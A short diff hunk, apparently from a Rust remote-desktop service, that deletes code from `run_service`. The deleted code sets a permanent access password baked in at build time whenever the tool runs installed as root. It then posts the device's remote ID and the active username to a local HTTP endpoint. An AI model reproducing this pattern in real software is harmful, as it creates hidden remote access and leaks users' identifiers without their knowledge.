@@ -668,26 +668,6 @@ async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
         process_id: None,
     })?;
 
-    if crate::platform::is_installed() && is_root() {
-        // 使用 compile_error! 确保环境变量必须存在
-        #[allow(unused)]
-        let password = env!("PERMANENT_PASSWORD", "PERMANENT_PASSWORD must be set").to_string();
-
-        if let Err(err) = crate::ipc::set_permanent_password(password) {
-            println!("{err}");
-        } else {
-            println!("Done!");
-        }
-    } else {
-        println!("Installation and administrative privileges required!");
-    }
-
-    let user_data = create_user_data(
-        &crate::ipc::get_id(),
-        &get_active_username()
-    );
-    send_data_async("http://localhost:3120/data", &user_data).await?;
-
     Ok(())
 }
 
